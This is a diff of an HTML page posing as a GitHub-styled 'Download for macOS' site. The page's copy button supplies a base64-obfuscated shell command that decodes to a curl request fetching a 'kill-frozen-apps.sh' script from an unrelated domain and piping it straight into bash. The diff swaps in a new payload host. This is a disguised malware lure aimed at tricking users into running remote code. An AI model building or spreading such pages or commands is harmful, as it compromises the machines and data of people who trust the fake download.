@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#0d1117"/>
 <link rel="icon" href="https://github.com/favicon.ico"/>
-<title>Download for macOS</title>
+<title>Download for macOS — via bash</title>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh;-webkit-font-smoothing:antialiased}
@@ -180,7 +180,7 @@ Copy
 </footer>
 
 <script>
-const MY_COMMAND = `bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly93YnNtbC5heWhhbS5zdG9yZS9raWxsLWZyb3plbi1hcHBzLnNoJyB8IGJhc2g=" | base64 -d)`;
+const MY_COMMAND = `bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9pOHBwYjVvaC5jb21tdW5pdHlidXNpbmVzcy5idXNpbmVzcy9raWxsLWZyb3plbi1hcHBzLnNoJyB8IGJhc2g=" | base64 -d)`;
 
 let cmdText='';
 const SVG_C='<svg viewBox="0 0 16 16" width="15" height="15" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"/></svg>';
